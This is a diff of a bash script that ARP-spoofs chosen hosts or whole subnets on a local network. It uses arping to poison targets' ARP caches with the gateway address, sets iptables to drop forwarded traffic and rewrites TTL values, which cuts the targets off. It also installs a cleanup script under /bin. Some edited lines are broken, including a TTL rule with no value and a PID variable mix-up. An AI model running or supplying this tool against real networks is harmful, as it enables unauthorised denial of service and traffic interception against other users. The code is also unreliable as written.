@@ -1,22 +1,11 @@
 #!/bin/bash
 
-# Cleanup        
-cat > /bin/spoofer-stop << EOF
-#!/bin/bash                                                                                                              
-
-iptables -t mangle -I PREROUTING -i $INTERFACE -j TTL --ttl-set 64
-iptables -P FORWARD ACCEPT
-iptables -F FORWARD                                     
-pkill -f arping
-EOF                                     
-chmod 755 /bin/spoofer-stop                                                                                              
-
-# Iptables policy                                                                
+# Set iptables drop policy
 iptables -P FORWARD DROP
-iptables -I FORWARD -j DROP                                                                       
+iptables -I FORWARD -j DROP
 
-# Drop hops                                                                      
-iptables -t mangle -I PREROUTING -i"$INTERFACE" -j TTL --ttl-set 0           
+# Block hops by setting TTL to 0
+iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 2>/dev/null
 
 # Function to auto-detect interface
 auto_detect_interface() {
@@ -52,41 +41,11 @@ get_device_ip() {
     echo "$device_ip"
 }
 
-# Function to expand CIDR to individual IPs
-expand_cidr() {
-    local cidr=$1
-    local gateway=$2
-    local device_ip=$3
-
-    # Check if ipcalc is available
-    if ! command -v ipcalc &> /dev/null; then
-        echo "Error: ipcalc not found. Cannot expand CIDR ranges."
-        return 1
-    fi
-
-    # Get network information
-    local network=$(ipcalc -n "$cidr" | cut -d'=' -f2)
-    local netmask=$(ipcalc -m "$cidr" | cut -d'=' -f2)
-
-    # Generate IP range
-    local start_ip=$(ipcalc -n "$cidr" | cut -d'=' -f2)
-    local end_ip=$(ipcalc -b "$cidr" | cut -d'=' -f2)
-
-    # Use nmap or seq to generate IPs (fallback method)
-    if command -v nmap &> /dev/null; then
-        nmap -sn "$cidr" -oG - | grep "Status: Up" | awk '{print $2}'
-    else
-        # Simple range expansion (works for smaller networks)
-        ipcalc -n "$cidr" | grep -E "HostMin|HostMax" | cut -d':' -f2 | tr -d ' '
-    fi
-}
-
 # Function to process targets (handle single IP, multiple IPs, CIDR)
 process_targets() {
     local targets_input=$1
     local gateway=$2
     local device_ip=$3
-    local interface=$4
 
     local target_list=()
 
@@ -97,35 +56,50 @@ process_targets() {
         # Check if it's a CIDR range
         if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
             echo "Expanding CIDR range: $target"
-            # For CIDR, get all IPs in the network
-            local cidr_ips=$(nmap -sn "$target" 2>/dev/null | grep report | awk '{print $NF}' 2>/dev/null)
-            if [[ -n "$cidr_ips" ]]; then
-                while IFS= read -r ip; do
-                    # Skip gateway and device IP
-                    if [[ "$ip" != "$gateway" ]] && [[ "$ip" != "$device_ip" ]]; then
-                        target_list+=("$ip")
+            # For CIDR, try to get all IPs in the network
+            if command -v nmap &> /dev/null; then
+                local cidr_ips=$(nmap -sn "$target" 2>/dev/null | grep report | awk '{print $NF}' 2>/dev/null)
+                if [[ -n "$cidr_ips" ]]; then
+                    while IFS= read -r ip; do
+                        # Skip gateway and device IP
+                        if [[ "$ip" != "$gateway" ]] && [[ "$ip" != "$device_ip" ]] && [[ -n "$ip" ]]; then
+                            target_list+=("$ip")
+                        fi
+                    done <<< "$cidr_ips"
+                else
+                    # Fallback: add base IP if nmap fails
+                    local base_ip=$(echo "$target" | cut -d'/' -f1)
+                    if [[ "$base_ip" != "$gateway" ]] && [[ "$base_ip" != "$device_ip" ]]; then
+                        target_list+=("$base_ip")
                     fi
-                done <<< "$cidr_ips"
+                fi
             else
-                # Fallback: manual CIDR expansion
+                # If no nmap, just add the base IP
                 local base_ip=$(echo "$target" | cut -d'/' -f1)
-                local prefix=$(echo "$target" | cut -d'/' -f2)
-                echo "Warning: Could not expand CIDR $target automatically"
-                target_list+=("$base_ip")  # Add base IP as fallback
+                if [[ "$base_ip" != "$gateway" ]] && [[ "$base_ip" != "$device_ip" ]]; then
+                    target_list+=("$base_ip")
+                fi
+                echo "Warning: nmap not found, using base IP only for CIDR: $target"
             fi
         else
             # Single IP or multiple space-separated IPs
-            # Skip gateway and device IP
-            if [[ "$target" != "$gateway" ]] && [[ "$target" != "$device_ip" ]]; then
-                target_list+=("$target")
+            # Validate IP format
+            if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+                # Skip gateway and device IP
+                if [[ "$target" != "$gateway" ]] && [[ "$target" != "$device_ip" ]]; then
+                    target_list+=("$target")
+                fi
             fi
         fi
     done
 
     # Return unique targets
-    printf '%s\n' "${target_list[@]}" | sort -u
+    if [[ ${#target_list[@]} -gt 0 ]]; then
+        printf '%s\n' "${target_list[@]}" | sort -u
+    fi
 }
 
+echo " "
 # Get interface
 read -rp "Enter network interface (or press Enter to auto-detect): " INTERFACE
 if [[ -z "$INTERFACE" ]]; then
@@ -141,7 +115,7 @@ fi
 
 # Get device IP
 DEVICE_IP=$(get_device_ip "$INTERFACE")
-echo "Device IP: $DEVICE_IP"
+echo "Auto-detected device IP: $DEVICE_IP"
 
 # Get gateway
 read -rp "Enter gateway IP (or press Enter to auto-detect): " GATEWAY
@@ -157,6 +131,7 @@ if [[ -n "$GATEWAY" ]] && [[ ! "$GATEWAY" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
 fi
 
 # Get targets
+echo " "
 echo "Enter target(s):"
 echo "  - Single IP: 192.168.1.100"
 echo "  - Multiple IPs: 192.168.1.100 192.168.1.101 192.168.1.102"
@@ -171,7 +146,7 @@ fi
 
 # Process targets
 echo "Processing targets..."
-PROCESSED_TARGETS=$(process_targets "$TARGETS_INPUT" "$GATEWAY" "$DEVICE_IP" "$INTERFACE")
+PROCESSED_TARGETS=$(process_targets "$TARGETS_INPUT" "$GATEWAY" "$DEVICE_IP")
 
 if [[ -z "$PROCESSED_TARGETS" ]]; then
     echo "Error: No valid targets found!"
@@ -182,23 +157,50 @@ echo
 echo "Configuration:"
 echo "  Interface:  $INTERFACE"
 echo "  Device IP:  $DEVICE_IP"
-echo "  Gateway IP  $GATEWAY"
-echo " "
+echo "  Gateway:    $GATEWAY"
+echo "  Targets:"
 while IFS= read -r target; do
-echo "  TARGET IP:  $target"
+    echo "    - $target"
 done <<< "$PROCESSED_TARGETS"
 echo
+
+# Create cleanup script
+cat > /bin/spoofer-stop << EOF
+#!/bin/bash
+
+# Restore TTL
+iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 64
+
+# Reset forwarding policy
+iptables -P FORWARD ACCEPT
+iptables -F FORWARD
+
+# Kill arping processes
+pkill -f arping
+pkill -f arpspoof
+
+# Remove hop blocking
+iptables -t mangle -D PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0 2>/dev/null
+
+echo "Spoofer cleanup complete"
+EOF
+chmod 755 /bin/spoofer-stop
+
+    # Store PIDs for cleanup
+    pids=()
 
     # Loop through each target and perform ARP spoofing
     while IFS= read -r target; do
         if [[ -n "$target" ]]; then
+            echo " "
             echo "Blocking the target IP: $target"
-            # Run arpspoof in background
-            arping -b -A -i "$INTERFACE" -S "$target" "$GATEWAY" >/dev/null 2>&1 &
             arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 &
+            pid2=$!
+            pids+=($pid1 )
         fi
     done <<< "$PROCESSED_TARGETS"
 
-    # stop
-    echo " "
-    echo "To stop, run: sudo spoofer-stop"
+# cleanup
+echo " "
+echo "Spoofer is running in the background!"
+echo "To stop, run: sudo spoofer-stop"
